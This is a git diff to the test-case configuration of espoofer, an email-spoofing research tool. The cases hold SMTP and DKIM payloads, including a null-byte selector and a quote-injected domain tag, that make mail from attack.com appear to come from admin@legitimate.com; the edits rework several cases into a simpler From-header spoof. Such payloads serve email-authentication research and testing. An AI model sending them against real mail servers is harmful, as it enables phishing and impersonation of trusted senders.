@@ -10,8 +10,8 @@ import config
 
 test_cases = {
     "server_a1": {
-        "helo": b"helo.attack.com",
-        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
+        "helo": b"attack.com",
+        "mailfrom": b"<admin@attack.com>",
         "rcptto": b"<victim@victim.com>",
         #"dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
         "data": {
@@ -19,9 +19,9 @@ test_cases = {
             "to_header": b"To: <victim@victim.com>\r\n",
             "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
             "body": b"Hi, this is a test message! Best wishes.\r\n",
-            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
+            "other_headers": b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/mixed;\r\n\tboundary=\"----=_Part_111217_462031992.1680524601073\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" + id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n",
         },
-        "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
+        "description": b"Simple From header spoof. Edited by anjhz."
     },
     "server_a2": {
         "helo": b"attack.com",
@@ -38,10 +38,11 @@ test_cases = {
         "description": b"Empty MAIL FROM addresses, refer to A2 attack in the paper."
     },
     "server_a3": {
-        "helo": b"33.attack.com",
-        "mailfrom": b"<any@33.attack.com>",
+        "helo": b"attack.com",
+        "mailfrom": b"<admin@attack.com>",
         "rcptto": b"<victim@victim.com>",
-        "dkim_para": {"d":b"legitimate.com", "s":b"selector._domainkey.attack.com.\x00.any", "sign_header": b"From: <admin@legitimate.com>"},
+        #"dkim_para": {"d":b"legitimate.com", "s":b"selector._domainkey.attack.com.\x00.any", "sign_header": b"From: <root@legitimate.com>"},
+        "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
         "data": {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
@@ -53,9 +54,10 @@ test_cases = {
     },
     "server_a4": {
         "helo": b"attack.com",
-        "mailfrom": b"<any@attack.com>",
+        "mailfrom": b"<admin@attack.com>",
         "rcptto": b"<victim@victim.com>",
-        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
+        #"dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
+        "dkim_para": {"d":b"attack.com", "s":b"default", "sign_header": b"From: <admin@legitimate.com>"},
         "data": {
             "from_header": b"From: <admin@legitimate.com>\r\n",
             "to_header": b"To: <victim@victim.com>\r\n",
@@ -277,7 +279,6 @@ test_cases = {
         },
         "description": b"Display Name and real address parsing inconsistencies, refer to Figure 8(f) in the paper."
     },
-
 
 
     "client_a1": {
